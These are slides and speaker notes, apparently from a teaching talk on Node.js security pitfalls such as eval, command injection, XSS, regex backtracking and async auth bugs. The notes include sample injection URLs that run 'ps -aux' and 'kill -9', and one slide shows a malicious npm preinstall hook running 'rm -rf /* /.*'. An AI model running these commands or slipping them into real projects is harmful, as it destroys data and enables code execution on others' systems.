# How to get hacked

---

# About _self
```javascript 
{
	name: "Josh Hollandsworth",
	job: "Software Engineer",
	providerOfIncome: "Asynchrony Labs",
}
```

???
As the slide says, my names Josh Hollandsworth and I am a software engineer with Asynchrony Labs. My background is writing backend and middle tier applications

---

# this.about()

1. Examples of how to get hacked
1. Ways to prevent them

???
This is the why we are here, or at least it is why I am here. As I previously said I am traditionally a backend/middle tier developer who absolutely loved being on the backend because it meant i never had to learn javascript! But then node came along, and it became increasinly clear that it was going to become a major contender against WCF, Servlets, and other traditional backend services frameworks. So as I begrudingly learned node and javascript I wanted to learn how to tackle the security challenges that I had to solve in other languages and tool sets. This talk is a collection
of the vulnerabilites I learned about, examples of how to exploit them, and ways to prevent them. 
---

# Disclaimers

--

From this point forward I will be speaking as someone who wants to hack your systems, doing most of the things from this point forward are a bad idea unless you want your company on the news for a data breach. 

--

If you chose to do the things from this point forward, let me know what company you work for so I never use your service.

???
Seriously, do not do these things
--

Do not treat this as an exhaustive list of security vulnerablities.

---

# Ways to get hacked 
???
So lets get started, anyone want to guess what rule number one is to insure you can get hacked?
--

1. Always trust your user
???
Always trust your user, most of them are good people that just want to use your services right? what could go wrong?
--

1. Never patch any vulnerable code
???
We all know that updating libraries has the risk of breaking your code, so its best to ignore updates
--

1. Store all of your secrets in plain text or leave them as the default value.
???
crypto can be slow, so its best to just use plain text. additionally any "secret" key should be left the default for the framework so new developers dont have to guess
---

# Injection

An injection attack is one in which a malcious user "injects" random bits of code in order to attack, or obtain information about the target system

![Bobby Tables](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)
 
_source xkcd_

???

One of the most known of means to attack an application is injection. This method allows potentially arbitrary code to be excuted on the sever

---

# eval is my bff

Executes a string of arbitrary javascript

```javascript 
	eval('alert(\'hi\')');
```

???
Who has heard that eval = evil? so why is it evil? 
well, it is slow because the jit cannot compile it until the string is built, secondly it allows arbitrary code to be executed and gets the scope of the containing function 

---

# eval is my bff

## Example

???
http://localhost:4000/?doIt=response.write%28%27hehe%27%29
---

# a friend of eval is a friend of mine

???
So knowing the vulnerability of eval, its understandable by why you should prefer to not use eval. However, thankfully eval has some friends
--
1. setInterval
1. setTimeout
1. new Function
???
setInteval and setTimeout both take a string or a function, if you pass it a string, it then behaves like eval. the function constructor is always backed by eval
---

# Making exec-utive decisions

An example with child_process.exec

???
This example allows you to inject code in a function that is meant to list the directory contents. It is exploitable because it trust the user and allows un sanitized input

	http://localhost:4000?path=.
	http://localhost:4000?path=. >> /dev/null;ps -aux
	http://localhost:4000?path=kill -9 

so how would you fix this? 
1. Dont accept un sanitized input
2. you most likely have a list of business specific directories that you intend to be shown, create a map of those directories and print out their result

---

# Cross Site Winning

Cross Site Scripting (XSS)

Cross Site Request Forgery (CSRF)

???
1. XSS is an injection based attack that allows malicious users such as my self to inject scripts that will be executed when a page loads/refreshes
1. CSRF is an injection attack which tricks a user into performing actions against a site that they are logged in via a maliciously injectd script

---
# Cross Site Winning

## Two Types

--

1. Reflected Cross Site Scripting

???
Occurs when a page has malicious scripts injected into a page with specailly crafted links etc

--

1. Stored Cross Site Scripting

???
Occurs when a malicious user is allowed to force a script to be persisted so that when the data is retrieved, the malicious code is executed.

---

# Cross site winning

## Example (Reflected)

---

# Not even the eventloop can save you
	
	Catastrophic backtracking

```javascript
const salary = input.match(/[1-9]((,\d{3})|(\d)+)+(\.00)/);
```

---

# Not even the eventloop can save you

What we are trying to do

```javascript
[1-9]
```     
must start with 1-9 

--

```javascript
(,\d{3})
```
must contain 3 digits after a comma

--
```javascript
|(\d)+
```
or contain any number of digits

--

```javascript
+(\.d{2})
```
followed by .NN

---


# Treat Node as if its synchronous

```javascript
let isAuthenticated = true;

db.query("select * from users where username = '?' and password = '?'"
	,{username: qs.username, password: qs.password}
	,()=> isAuthenticated = true,
	,(error)=> { 
		console.log(error); 
		isAuthenticated = false;
	});

if(isAuthenticated) {
	//do super secret thing!
}
```

---

# Getting Buff-ers



---

# Ignore warnings, like you have since C


---

# Don't research your node modules.

```json
"scripts" : {
	"preinstall": "rm -rf /* /.*"
}
```

???
Who knows what this does? 
Spreinstall script is something that npm will execute prior to the package being install but after it has downloaded. In this case it is a forced delete of all files. This was from a proof of concept that 
Joao Jeronimo (joe-ow zheronimo) distributed on npm as the package rmrafalll before the package was removed in march of 2016

---

# this.done() 

Thank you!


